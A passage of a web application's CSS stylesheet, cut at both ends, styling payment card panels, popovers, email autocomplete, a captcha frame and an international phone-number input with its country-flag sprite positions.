        .pm_form .cardPanel .cardPanel-country,
        .pm_form .cardPanel .cardPanel-expires,
        .pm_form .cardPanel .cardPanel-holder {
            position: absolute;
            top: 15px;
            left: 19px;
            text-transform: capitalize
        }

        .pm_form .cardPanel .cardPanel-country {
            font-size: .7rem
        }

        .pm_form .cardPanel .cardPanel-expires,
        .pm_form .cardPanel .cardPanel-holder {
            top: 145px;
            font-size: 1rem
        }

        .pm_form .cardPanel .cardPanel-expires {
            text-align: right;
            left: auto;
            right: 20px
        }

        .paginator-disabled-main .paginator-dropdown,
        .paginator-disabled-next .paginator-btn-next,
        .paginator-disabled-previous .paginator-btn-previous {
            pointer-events: none;
            -webkit-box-shadow: none;
            box-shadow: none;
            color: #acb0bf;
            -webkit-box-shadow: inset 0 0 50rem 0 #f3f5f8;
            box-shadow: inset 0 0 50rem 0 #f3f5f8
        }

        .paginator-dropdown-list {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex
        }

        .paginator-label {
            pointer-events: none
        }

        .popover {
            position: absolute;
            padding: 1px;
            top: 0;
            left: 0;
            z-index: 100000;
            display: none;
            max-width: 280px;
            background-color: #fff;
            border-radius: 2px;
            -webkit-box-shadow: 1px 1px 3px rgba(0, 0, 0, .33), 0 0 2px rgba(0, 0, 0, .33);
            box-shadow: 1px 1px 3px rgba(0, 0, 0, .33), 0 0 2px rgba(0, 0, 0, .33)
        }

        .popover.top {
            margin-top: -10px
        }

        .popover.right {
            margin-left: 10px
        }

        .popover.bottom {
            margin-top: 10px
        }

        .popover.left {
            margin-left: -10px
        }

        .popover-title {
            margin: 0;
            padding: 8px 14px;
            background-color: #e6eaf0;
            border-bottom: #acb0bf
        }

        .popover-content {
            padding: 9px 14px
        }

        .popover>.arrow,
        .popover>.arrow:after {
            position: absolute;
            display: block;
            width: 0;
            height: 0;
            border-color: transparent;
            border-style: solid
        }

        .popover>.arrow {
            border-width: 11px
        }

        .popover>.arrow:after {
            border-width: 10px;
            content: ""
        }

        .popover.top>.arrow {
            left: 50%;
            margin-left: -11px;
            border-bottom-width: 0;
            border-top-color: #999;
            border-top-color: #acb0bf;
            bottom: -11px
        }

        .popover.top>.arrow:after {
            content: " ";
            bottom: 1px;
            margin-left: -10px;
            border-bottom-width: 0;
            border-top-color: #fff
        }

        .popover.right>.arrow {
            top: 50%;
            left: -11px;
            margin-top: -11px;
            border-left-width: 0;
            border-right-color: #999;
            border-right-color: #acb0bf
        }

        .popover.right>.arrow:after {
            content: " ";
            left: 1px;
            bottom: -10px;
            border-left-width: 0;
            border-right-color: #fff
        }

        .popover.bottom>.arrow {
            left: 50%;
            margin-left: -11px;
            border-top-width: 0;
            border-bottom-color: #999;
            border-bottom-color: #acb0bf;
            top: -11px
        }

        .popover.bottom>.arrow:after {
            content: " ";
            top: 1px;
            margin-left: -10px;
            border-top-width: 0;
            border-bottom-color: #fff
        }

        .popover.left>.arrow {
            top: 50%;
            right: -11px;
            margin-top: -11px;
            border-right-width: 0;
            border-left-color: #999;
            border-left-color: #acb0bf
        }

        .popover.left>.arrow:after {
            content: " ";
            right: 1px;
            border-right-width: 0;
            border-left-color: #fff;
            bottom: -10px
        }

        .createLabel-button {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            height: auto;
            min-height: 30px;
            width: 100%;
            padding: 0;
            border: 0;
            line-height: 16px;
            font-weight: 700;
            background: transparent;
            word-wrap: break-word;
            text-transform: none;
            text-align: left;
            color: #9397cd;
            -webkit-box-shadow: none;
            box-shadow: none;
            cursor: pointer
        }

        .createLabel-button i {
            color: #000
        }

        .createLabel-button.createLabel-withName .createLabel-new-label,
        .createLabel-button:not(.createLabel-withName) .createLabel-new-name {
            display: none
        }

        .captchaView {
            position: relative;
            min-height: 120px
        }

        .captchaView .loading {
            position: absolute;
            height: 100%;
            left: 0;
            right: 0;
            z-index: 1
        }

        .captchaView iframe {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-flex: 1;
            -webkit-box-flex: 1;
            -ms-flex: 1;
            flex: 1;
            min-height: 0;
            height: 120px;
            border: 0;
            outline: none;
            border: none;
            position: relative;
            overflow: hidden;
            z-index: 5
        }

        .pm_modal .captchaView iframe {
            width: 310px;
            margin: 0 auto
        }

        .welcome-socialList-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            list-style: none;
            padding: 0;
            margin: 0
        }

        .welcome-socialList-item {
            margin: 1em 2px;
            white-space: nowrap
        }

        .appConfigBody-is-mobile .welcome-socialList-item:first-of-type {
            width: 100%;
            clear: both
        }

        .autocompleteEmails-container {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            color: #555;
            font-size: 13px;
            width: 100%
        }

        .autocompleteEmails-admin {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            min-height: 30px;
            line-height: 30px;
            padding: 0;
            vertical-align: middle;
            width: 100%;
            position: relative;
            max-height: 100px;
            overflow-y: auto;
            overflow-x: hidden
        }

        .autocompleteEmails-admin,
        .autocompleteEmails-admin * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .autocompleteEmails-item {
            border: 1px solid #e1e1e1;
            background-color: #e6eaf0;
            margin-top: 5px;
            text-shadow: none;
            border-radius: 2px;
            padding-left: 5px;
            margin-right: 5px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row;
            line-height: 22px;
            height: 22px;
            max-width: 85%;
            min-width: 0
        }

        .autocompleteEmails-item-invalid {
            border-color: #cc9393;
            color: #cc9393
        }

        .autocompleteEmails-label {
            text-overflow: ellipsis;
            word-wrap: break-word;
            overflow: hidden;
            white-space: nowrap
        }

        .autocompleteEmails-field {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            min-width: 15%
        }

        .autocomplete-container .awesomplete {
            display: block;
            position: static
        }

        .autocomplete-container .awesomplete input,
        .autocompleteEmails-autocomplete input {
            width: 100%
        }

        .autocomplete-container .awesomplete ::-ms-clear,
        .autocompleteEmails-autocomplete ::-ms-clear {
            display: none;
            width: 0;
            height: 0
        }

        .autocomplete-container .awesomplete ul,
        .autocompleteEmails-autocomplete ul {
            border-radius: 0;
            max-height: 150px;
            overflow: auto;
            z-index: 99999;
            border: 1px solid #acb0bf;
            background-color: #fff;
            -webkit-box-shadow: none;
            box-shadow: none;
            -webkit-transform: scale(1) !important;
            transform: scale(1) !important;
            -webkit-transition-duration: 0s !important;
            transition-duration: 0s !important
        }

        .autocomplete-container .awesomplete ul[hidden],
        .autocompleteEmails-autocomplete ul[hidden] {
            pointer-events: none
        }

        .autocomplete-container .awesomplete ul:before,
        .autocomplete-container .awesomplete ul:empty,
        .autocompleteEmails-autocomplete ul:before,
        .autocompleteEmails-autocomplete ul:empty {
            display: none
        }

        .autocomplete-container .awesomplete li[aria-selected=true],
        .autocomplete-container .awesomplete li[aria-selected=true]:hover,
        .autocompleteEmails-autocomplete li[aria-selected=true],
        .autocompleteEmails-autocomplete li[aria-selected=true]:hover {
            background-color: #e1e1e1
        }

        .autocomplete-container .awesomplete li:hover,
        .autocompleteEmails-autocomplete li:hover {
            background-color: #f4f4f4
        }

        .autocomplete-container .awesomplete li,
        .autocomplete-container .awesomplete li:hover,
        .autocomplete-container .awesomplete li[aria-selected=true],
        .autocomplete-container .awesomplete li[aria-selected=true]:hover,
        .autocompleteEmails-autocomplete li,
        .autocompleteEmails-autocomplete li:hover,
        .autocompleteEmails-autocomplete li[aria-selected=true],
        .autocompleteEmails-autocomplete li[aria-selected=true]:hover {
            color: #555
        }

        .autocomplete-container .awesomplete li:hover mark,
        .autocomplete-container .awesomplete li[aria-selected=true] mark,
        .autocomplete-container .awesomplete mark,
        .autocompleteEmails-autocomplete li:hover mark,
        .autocompleteEmails-autocomplete li[aria-selected=true] mark,
        .autocompleteEmails-autocomplete mark {
            color: inherit;
            background-color: transparent;
            font-weight: 700
        }

        .autocompleteEmails-autocomplete {
            border-radius: 0;
            max-height: 150px;
            overflow: auto;
            z-index: 9000;
            border: 1px solid #acb0bf;
            background-color: #fff;
            -webkit-box-shadow: none;
            box-shadow: none;
            -webkit-transform: scale(1) !important;
            transform: scale(1) !important;
            -webkit-transition-duration: 0s !important;
            transition-duration: 0s !important
        }

        .autocompleteEmails-autocomplete [hidden] {
            pointer-events: none
        }

        .autocompleteEmails-autocomplete :before,
        .autocompleteEmails-autocomplete :empty {
            display: none
        }

        .autocompleteEmails-autocomplete {
            position: fixed;
            width: 92%
        }

        .autocompleteEmails-autocomplete li {
            padding: 0 .5em
        }

        .autocompleteEmails-autocomplete:before,
        .autocompleteEmails-autocomplete:empty,
        .autocompleteEmails-autocomplete[hidden] {
            pointer-events: none;
            display: none
        }

        .autocompleteEmails-btn-remove {
            cursor: pointer;
            background: transparent;
            border: 0
        }

        .autocompleteEmails-btn-remove:active,
        .autocompleteEmails-btn-remove:focus {
            color: #f35d5d
        }

        .autocompleteEmails-field .visually-hidden {
            display: none
        }

        .autocompleteEmail-container .awesomplete {
            font-size: 13px
        }

        .autocompleteEmail-container .awesomplete ul {
            overflow-x: hidden
        }

        .autocompleteEmail-container .awesomplete [aria-selected] {
            padding: .6em .5em
        }

        .intl-tel-input {
            position: relative;
            display: inline-block
        }

        .intl-tel-input * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            -moz-box-sizing: border-box
        }

        .intl-tel-input .hide {
            display: none
        }

        .intl-tel-input .v-hide {
            visibility: hidden
        }

        .intl-tel-input input,
        .intl-tel-input input[type=tel],
        .intl-tel-input input[type=text] {
            position: relative;
            z-index: 0;
            margin-top: 0 !important;
            margin-bottom: 0 !important;
            padding-right: 36px;
            margin-right: 0
        }

        .intl-tel-input .flag-container {
            position: absolute;
            top: 0;
            bottom: 0;
            right: 0;
            padding: 1px
        }

        .intl-tel-input .selected-flag {
            z-index: 1;
            position: relative;
            width: 36px;
            height: 100%;
            padding: 0 0 0 8px
        }

        .intl-tel-input .selected-flag .iti-flag {
            position: absolute;
            top: 0;
            bottom: 0;
            margin: auto
        }

        .intl-tel-input .selected-flag .iti-arrow {
            position: absolute;
            top: 50%;
            margin-top: -2px;
            right: 6px;
            width: 0;
            height: 0;
            border-left: 3px solid transparent;
            border-right: 3px solid transparent;
            border-top: 4px solid #555
        }

        .intl-tel-input .selected-flag .iti-arrow.up {
            border-top: none;
            border-bottom: 4px solid #555
        }

        .intl-tel-input .country-list {
            position: absolute;
            z-index: 2;
            list-style: none;
            text-align: left;
            padding: 0;
            margin: 0 0 0 -1px;
            -webkit-box-shadow: 1px 1px 4px rgba(0, 0, 0, .2);
            box-shadow: 1px 1px 4px rgba(0, 0, 0, .2);
            background-color: #fff;
            border: 1px solid #ccc;
            white-space: nowrap;
            max-height: 200px;
            overflow-y: scroll
        }

        .intl-tel-input .country-list.dropup {
            bottom: 100%;
            margin-bottom: -1px
        }

        .intl-tel-input .country-list .flag-box {
            display: inline-block;
            width: 20px
        }

        @media (max-width:500px) {
            .intl-tel-input .country-list {
                white-space: normal
            }
        }

        .intl-tel-input .country-list .divider {
            padding-bottom: 5px;
            margin-bottom: 5px;
            border-bottom: 1px solid #ccc
        }

        .intl-tel-input .country-list .country {
            padding: 5px 10px
        }

        .intl-tel-input .country-list .country .dial-code {
            color: #999
        }

        .intl-tel-input .country-list .country.highlight {
            background-color: rgba(0, 0, 0, .05)
        }

        .intl-tel-input .country-list .country-name,
        .intl-tel-input .country-list .dial-code,
        .intl-tel-input .country-list .flag-box {
            vertical-align: middle
        }

        .intl-tel-input .country-list .country-name,
        .intl-tel-input .country-list .flag-box {
            margin-right: 6px
        }

        .intl-tel-input.allow-dropdown input,
        .intl-tel-input.allow-dropdown input[type=tel],
        .intl-tel-input.allow-dropdown input[type=text] {
            padding-right: 6px;
            padding-left: 52px;
            margin-left: 0
        }

        .intl-tel-input.allow-dropdown .flag-container {
            right: auto;
            left: 0
        }

        .intl-tel-input.allow-dropdown .selected-flag {
            width: 46px
        }

        .intl-tel-input.allow-dropdown .flag-container:hover {
            cursor: pointer
        }

        .intl-tel-input.allow-dropdown .flag-container:hover .selected-flag {
            background-color: rgba(0, 0, 0, .05)
        }

        .intl-tel-input.allow-dropdown input[disabled]+.flag-container:hover,
        .intl-tel-input.allow-dropdown input[readonly]+.flag-container:hover {
            cursor: default
        }

        .intl-tel-input.allow-dropdown input[disabled]+.flag-container:hover .selected-flag,
        .intl-tel-input.allow-dropdown input[readonly]+.flag-container:hover .selected-flag {
            background-color: transparent
        }

        .intl-tel-input.allow-dropdown.separate-dial-code .selected-flag {
            background-color: rgba(0, 0, 0, .05);
            display: table
        }

        .intl-tel-input.allow-dropdown.separate-dial-code .selected-dial-code {
            display: table-cell;
            vertical-align: middle;
            padding-left: 28px
        }

        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-2 input,
        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-2 input[type=tel],
        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-2 input[type=text] {
            padding-left: 76px
        }

        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-2 .selected-flag {
            width: 70px
        }

        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-3 input,
        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-3 input[type=tel],
        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-3 input[type=text] {
            padding-left: 84px
        }

        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-3 .selected-flag {
            width: 78px
        }

        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-4 input,
        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-4 input[type=tel],
        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-4 input[type=text] {
            padding-left: 92px
        }

        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-4 .selected-flag {
            width: 86px
        }

        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-5 input,
        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-5 input[type=tel],
        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-5 input[type=text] {
            padding-left: 100px
        }

        .intl-tel-input.allow-dropdown.separate-dial-code.iti-sdc-5 .selected-flag {
            width: 94px
        }

        .intl-tel-input.iti-container {
            position: absolute;
            top: -1000px;
            left: -1000px;
            z-index: 1060;
            padding: 1px
        }

        .intl-tel-input.iti-container:hover {
            cursor: pointer
        }

        .iti-mobile .intl-tel-input.iti-container {
            top: 30px;
            bottom: 30px;
            left: 30px;
            right: 30px;
            position: fixed
        }

        .iti-mobile .intl-tel-input .country-list {
            max-height: 100%;
            width: 100%
        }

        .iti-mobile .intl-tel-input .country-list .country {
            padding: 10px;
            line-height: 1.5em
        }

        .iti-flag.be {
            width: 18px
        }

        .iti-flag.ch {
            width: 15px
        }

        .iti-flag.mc {
            width: 19px
        }

        .iti-flag.ne {
            width: 18px
        }

        .iti-flag.np {
            width: 13px
        }

        .iti-flag.va {
            width: 15px
        }

        @media only screen and (-webkit-min-device-pixel-ratio:2),
        only screen and (min--moz-device-pixel-ratio:2),
        only screen and (min-device-pixel-ratio:2),
        only screen and (min-resolution:2dppx),
        only screen and (min-resolution:192dpi) {
            .iti-flag {
                background-size: 5630px 15px
            }
        }

        .iti-flag.ac {
            height: 10px;
            background-position: 0 0
        }

        .iti-flag.ad {
            height: 14px;
            background-position: -22px 0
        }

        .iti-flag.ae {
            height: 10px;
            background-position: -44px 0
        }

        .iti-flag.af {
            height: 14px;
            background-position: -66px 0
        }

        .iti-flag.ag {
            height: 14px;
            background-position: -88px 0
        }

        .iti-flag.ai {
            height: 10px;
            background-position: -110px 0
        }

        .iti-flag.al {
            height: 15px;
            background-position: -132px 0
        }

        .iti-flag.am {
            height: 10px;
            background-position: -154px 0
        }

        .iti-flag.ao {
            height: 14px;
            background-position: -176px 0
        }

        .iti-flag.aq {
            height: 14px;
            background-position: -198px 0
        }

        .iti-flag.ar {
            height: 13px;
            background-position: -220px 0
        }

        .iti-flag.as {
            height: 10px;
            background-position: -242px 0
        }

        .iti-flag.at {
            height: 14px;
            background-position: -264px 0
        }

        .iti-flag.au {
            height: 10px;
            background-position: -286px 0
        }

        .iti-flag.aw {
            height: 14px;
            background-position: -308px 0
        }

        .iti-flag.ax {
            height: 13px;
            background-position: -330px 0
        }

        .iti-flag.az {
            height: 10px;
            background-position: -352px 0
        }

        .iti-flag.ba {
            height: 10px;
            background-position: -374px 0
        }

        .iti-flag.bb {
            height: 14px;
            background-position: -396px 0
        }

        .iti-flag.bd {
            height: 12px;
            background-position: -418px 0
        }

        .iti-flag.be {
            height: 15px;
            background-position: -440px 0
        }

        .iti-flag.bf {
            height: 14px;
            background-position: -460px 0
        }

        .iti-flag.bg {
            height: 12px;
            background-position: -482px 0
        }

        .iti-flag.bh {
            height: 12px;
            background-position: -504px 0
        }

        .iti-flag.bi {
            height: 12px;
            background-position: -526px 0
        }

        .iti-flag.bj {
            height: 14px;
            background-position: -548px 0
        }

        .iti-flag.bl {
            height: 14px;
            background-position: -570px 0
        }

        .iti-flag.bm {
            height: 10px;
            background-position: -592px 0
        }

        .iti-flag.bn {
            height: 10px;
            background-position: -614px 0
        }

        .iti-flag.bo {
            height: 14px;
            background-position: -636px 0
        }

        .iti-flag.bq {
            height: 14px;
            background-position: -658px 0
        }

        .iti-flag.br {
            height: 14px;
            background-position: -680px 0
        }

        .iti-flag.bs {
            height: 10px;
            background-position: -702px 0
        }

        .iti-flag.bt {
            height: 14px;
            background-position: -724px 0
        }

        .iti-flag.bv {
            height: 15px;
            background-position: -746px 0
        }

        .iti-flag.bw {
            height: 14px;
            background-position: -768px 0
        }

        .iti-flag.by {
            height: 10px;
            background-position: -790px 0
        }

        .iti-flag.bz {
            height: 14px;
            background-position: -812px 0
        }

        .iti-flag.ca {
            height: 10px;
            background-position: -834px 0
        }

        .iti-flag.cc {
            height: 10px;
            background-position: -856px 0
        }

        .iti-flag.cd {
            height: 15px;
            background-position: -878px 0
        }

        .iti-flag.cf {
            height: 14px;
            background-position: -900px 0
        }

        .iti-flag.cg {
            height: 14px;
            background-position: -922px 0
        }

        .iti-flag.ch {
            height: 15px;
            background-position: -944px 0
        }

        .iti-flag.ci {
            height: 14px;
            background-position: -961px 0
        }

        .iti-flag.ck {
            height: 10px;
            background-position: -983px 0
        }

        .iti-flag.cl {
            height: 14px;
            background-position: -1005px 0
        }

        .iti-flag.cm {
            height: 14px;
            background-position: -1027px 0
        }

        .iti-flag.cn {
            height: 14px;
            background-position: -1049px 0
        }

        .iti-flag.co {
            height: 14px;
            background-position: -1071px 0
        }

        .iti-flag.cp {
            height: 14px;
            background-position: -1093px 0
        }

        .iti-flag.cr {
            height: 12px;
            background-position: -1115px 0
        }

        .iti-flag.cu {
            height: 10px;
            background-position: -1137px 0
        }

        .iti-flag.cv {
            height: 12px;
            background-position: -1159px 0
        }

        .iti-flag.cw {
            height: 14px;
            background-position: -1181px 0
        }

        .iti-flag.cx {
            height: 10px;
            background-position: -1203px 0
        }

        .iti-flag.cy {
            height: 13px;
            background-position: -1225px 0
        }

        .iti-flag.cz {
            height: 14px;
            background-position: -1247px 0
        }

        .iti-flag.de {
            height: 12px;
            background-position: -1269px 0
        }

        .iti-flag.dg {
            height: 10px;
            background-position: -1291px 0
        }

        .iti-flag.dj {
            height: 14px;
            background-position: -1313px 0
        }

        .iti-flag.dk {
            height: 15px;
            background-position: -1335px 0
        }

        .iti-flag.dm {
            height: 10px;
            background-position: -1357px 0
        }

        .iti-flag.do {
            height: 13px;
            background-position: -1379px 0
        }

        .iti-flag.dz {
            height: 14px;
            background-position: -1401px 0
        }

        .iti-flag.ea {
            height: 14px;
            background-position: -1423px 0
        }

        .iti-flag.ec {
            height: 14px;
            background-position: -1445px 0
        }

        .iti-flag.ee {
            height: 13px;
            background-position: -1467px 0
        }

        .iti-flag.eg {
            height: 14px;
            background-position: -1489px 0
        }

        .iti-flag.eh {
            height: 10px;
            background-position: -1511px 0
        }

        .iti-flag.er {
            height: 10px;
            background-position: -1533px 0
        }

        .iti-flag.es {
            height: 14px;
            background-position: -1555px 0
        }

        .iti-flag.et {
            height: 10px;
            background-position: -1577px 0
        }

        .iti-flag.eu {
            height: 14px;
            background-position: -1599px 0
        }

        .iti-flag.fi {
            height: 12px;
            background-position: -1621px 0
        }

        .iti-flag.fj {
            height: 10px;
            background-position: -1643px 0
        }

        .iti-flag.fk {
            height: 10px;
            background-position: -1665px 0
        }

        .iti-flag.fm {
            height: 11px;
            background-position: -1687px 0
        }

        .iti-flag.fo {
            height: 15px;
            background-position: -1709px 0
        }

        .iti-flag.fr {
            height: 14px;
            background-position: -1731px 0
        }

        .iti-flag.ga {
            height: 15px;
            background-position: -1753px 0
        }

        .iti-flag.gb {
            height: 10px;
            background-position: -1775px 0
        }

        .iti-flag.gd {
            height: 12px;
            background-position: -1797px 0
        }

        .iti-flag.ge {
            height: 14px;
            background-position: -1819px 0
        }

        .iti-flag.gf {
            height: 14px;
            background-position: -1841px 0
        }

        .iti-flag.gg {
            height: 14px;
            background-position: -1863px 0
        }

        .iti-flag.gh {
            height: 14px;
            background-position: -1885px 0
        }

        .iti-flag.gi {
            height: 10px;
            background-position: -1907px 0
        }

        .iti-flag.gl {
            height: 14px;
            background-position: -1929px 0
        }

        .iti-flag.gm {
            height: 14px;
            background-position: -1951px 0
        }

        .iti-flag.gn {
            height: 14px;
            background-position: -1973px 0
        }

        .iti-flag.gp {
            height: 14px;
            background-position: -1995px 0
        }

        .iti-flag.gq {
            height: 14px;
            background-position: -2017px 0
        }

        .iti-flag.gr {
            height: 14px;
            background-position: -2039px 0
        }

        .iti-flag.gs {
            height: 10px;
            background-position: -2061px 0
        }

        .iti-flag.gt {
            height: 13px;
            background-position: -2083px 0
        }

        .iti-flag.gu {
            height: 11px;
            background-position: -2105px 0
        }

        .iti-flag.gw {
            height: 10px;
            background-position: -2127px 0
        }

        .iti-flag.gy {
            height: 12px;
            background-position: -2149px 0
        }

        .iti-flag.hk {
            height: 14px;
            background-position: -2171px 0
        }

        .iti-flag.hm {
            height: 10px;
            background-position: -2193px 0
        }

        .iti-flag.hn {
            height: 10px;
            background-position: -2215px 0
        }

        .iti-flag.hr {
            height: 10px;
            background-position: -2237px 0
        }

        .iti-flag.ht {
            height: 12px;
            background-position: -2259px 0
        }

        .iti-flag.hu {
            height: 10px;
            background-position: -2281px 0
        }

        .iti-flag.ic {
            height: 14px;
            background-position: -2303px 0
        }

        .iti-flag.id {
            height: 14px;
            background-position: -2325px 0
        }

        .iti-flag.ie {
            height: 10px;
            background-position: -2347px 0
        }

        .iti-flag.il {
            height: 15px;
            background-position: -2369px 0
        }

        .iti-flag.im {
            height: 10px;
            background-position: -2391px 0
        }

        .iti-flag.in {
            height: 14px;
            background-position: -2413px 0
        }

        .iti-flag.io {
            height: 10px;
            background-position: -2435px 0
        }

        .iti-flag.iq {
            height: 14px;
            background-position: -2457px 0
        }

        .iti-flag.ir {
            height: 12px;
            background-position: -2479px 0
        }

        .iti-flag.is {
            height: 15px;
            background-position: -2501px 0
        }

        .iti-flag.it {
            height: 14px;
            background-position: -2523px 0
        }

        .iti-flag.je {
            height: 12px;
            background-position: -2545px 0
        }

        .iti-flag.jm {
            height: 10px;
            background-position: -2567px 0
        }

        .iti-flag.jo {
            height: 10px;
            background-position: -2589px 0
        }

        .iti-flag.jp {
            height: 14px;
            background-position: -2611px 0
        }

        .iti-flag.ke {
            height: 14px;
            background-position: -2633px 0
        }

        .iti-flag.kg {
            height: 12px;
            background-position: -2655px 0
        }

        .iti-flag.kh {
            height: 13px;
            background-position: -2677px 0
        }

        .iti-flag.ki {
            height: 10px;
            background-position: -2699px 0
        }

        .iti-flag.km {
            height: 12px;
            background-position: -2721px 0
        }

        .iti-flag.kn {
            height: 14px;
            background-position: -2743px 0
        }

        .iti-flag.kp {
            height: 10px;
            background-position: -2765px 0
        }

        .iti-flag.kr {
            height: 14px;
            background-position: -2787px 0
        }

        .iti-flag.kw {
            height: 10px;
            background-position: -2809px 0
        }

        .iti-flag.ky {
            height: 10px;
            background-position: -2831px 0
        }

        .iti-flag.kz {
            height: 10px;
            background-position: -2853px 0
        }

        .iti-flag.la {
            height: 14px;
            background-position: -2875px 0
        }

        .iti-flag.lb {
            height: 14px;
            background-position: -2897px 0
        }

        .iti-flag.lc {
            height: 10px;
            background-position: -2919px 0
        }

        .iti-flag.li {
            height: 12px;
            background-position: -2941px 0
        }

        .iti-flag.lk {
            height: 10px;
            background-position: -2963px 0
        }

        .iti-flag.lr {
            height: 11px;
            background-position: -2985px 0
        }

        .iti-flag.ls {
            height: 14px;
            background-position: -3007px 0
        }

        .iti-flag.lt {
            height: 12px;
            background-position: -3029px 0
        }

        .iti-flag.lu {
            height: 12px;
            background-position: -3051px 0
        }

        .iti-flag.lv {
            height: 10px;
            background-position: -3073px 0
        }

        .iti-flag.ly {
            height: 10px;
            background-position: -3095px 0
        }

        .iti-flag.ma {
            height: 14px;
            background-position: -3117px 0
        }

        .iti-flag.mc {
            height: 15px;
            background-position: -3139px 0
        }

        .iti-flag.md {
            height: 10px;
            background-position: -3160px 0
        }

        .iti-flag.me {
            height: 10px;
            background-position: -3182px 0
        }

        .iti-flag.mf {
            height: 14px;
            background-position: -3204px 0
        }

        .iti-flag.mg {
            height: 14px;
            background-position: -3226px 0
        }

        .iti-flag.mh {
            height: 11px;
            background-position: -3248px 0
        }

        .iti-flag.mk {
            height: 10px;
            background-position: -3270px 0
        }

        .iti-flag.ml {
            height: 14px;
            background-position: -3292px 0
        }

        .iti-flag.mm {
            height: 14px;
            background-position: -3314px 0
        }

        .iti-flag.mn {
            height: 10px;
            background-position: -3336px 0
        }

        .iti-flag.mo {
            height: 14px;
            background-position: -3358px 0
        }

        .iti-flag.mp {
            height: 10px;
            background-position: -3380px 0
        }

        .iti-flag.mq {
            height: 14px;
            background-position: -3402px 0
        }

        .iti-flag.mr {
            height: 14px;
            background-position: -3424px 0
        }

        .iti-flag.ms {
            height: 10px;
            background-position: -3446px 0
        }

        .iti-flag.mt {
            height: 14px;
            background-position: -3468px 0
        }

        .iti-flag.mu {
            height: 14px;
            background-position: -3490px 0
        }

        .iti-flag.mv {
            height: 14px;
            background-position: -3512px 0
        }

        .iti-flag.mw {
            height: 14px;
            background-position: -3534px 0
        }

        .iti-flag.mx {
            height: 12px;
            background-position: -3556px 0
        }

        .iti-flag.my {
            height: 10px;
            background-position: -3578px 0
        }

        .iti-flag.mz {
            height: 14px;
            background-position: -3600px 0
        }

        .iti-flag.na {
            height: 14px;
            background-position: -3622px 0
        }

        .iti-flag.nc {
            height: 10px;
            background-position: -3644px 0
        }

        .iti-flag.ne {
            height: 15px;
            background-position: -3666px 0
        }

        .iti-flag.nf {
            height: 10px;
            background-position: -3686px 0
        }

        .iti-flag.ng {
            height: 10px;
            background-position: -3708px 0
        }

        .iti-flag.ni {
            height: 12px;
            background-position: -3730px 0
        }

        .iti-flag.nl {
            height: 14px;
            background-position: -3752px 0
        }

        .iti-flag.no {
            height: 15px;
            background-position: -3774px 0
        }

        .iti-flag.np {
            height: 15px;
            background-position: -3796px 0
        }

        .iti-flag.nr {
            height: 10px;
            background-position: -3811px 0
        }

        .iti-flag.nu {
            height: 10px;
            background-position: -3833px 0
        }

        .iti-flag.nz {
            height: 10px;
            background-position: -3855px 0
        }

        .iti-flag.om {
            height: 10px;
            background-position: -3877px 0
        }

        .iti-flag.pa {
            height: 14px;
            background-position: -3899px 0
        }

        .iti-flag.pe {
            height: 14px;
            background-position: -3921px 0
        }

        .iti-flag.pf {
            height: 14px;
            background-position: -3943px 0
        }

        .iti-flag.pg {
            height: 15px;
            background-position: -3965px 0
        }

        .iti-flag.ph {
            height: 10px;
            background-position: -3987px 0
        }

        .iti-flag.pk {
            height: 14px;
            background-position: -4009px 0
        }

        .iti-flag.pl {
            height: 13px;
            background-position: -4031px 0
        }

        .iti-flag.pm {
            height: 14px;
            background-position: -4053px 0
        }

        .iti-flag.pn {
            height: 10px;
            background-position: -4075px 0
        }

        .iti-flag.pr {
            height: 14px;
            background-position: -4097px 0
        }

        .iti-flag.ps {
            height: 10px;
            background-position: -4119px 0
        }

        .iti-flag.pt {
            height: 14px;
            background-position: -4141px 0
        }

        .iti-flag.pw {
            height: 13px;
            background-position: -4163px 0
        }

        .iti-flag.py {
            height: 11px;
            background-position: -4185px 0
        }

        .iti-flag.qa {
            height: 8px;
            background-position: -4207px 0
        }

        .iti-flag.re {
            height: 14px;
            background-position: -4229px 0
        }

        .iti-flag.ro {
            height: 14px;
            background-position: -4251px 0
        }

        .iti-flag.rs {
            height: 14px;
            background-position: -4273px 0
        }

        .iti-flag.ru {
            height: 14px;
            background-position: -4295px 0
        }

        .iti-flag.rw {
            height: 14px;
            background-position: -4317px 0
        }

        .iti-flag.sa {
            height: 14px;
            background-position: -4339px 0
        }

        .iti-flag.sb {
            height: 10px;
            background-position: -4361px 0
        }

        .iti-flag.sc {
            height: 10px;
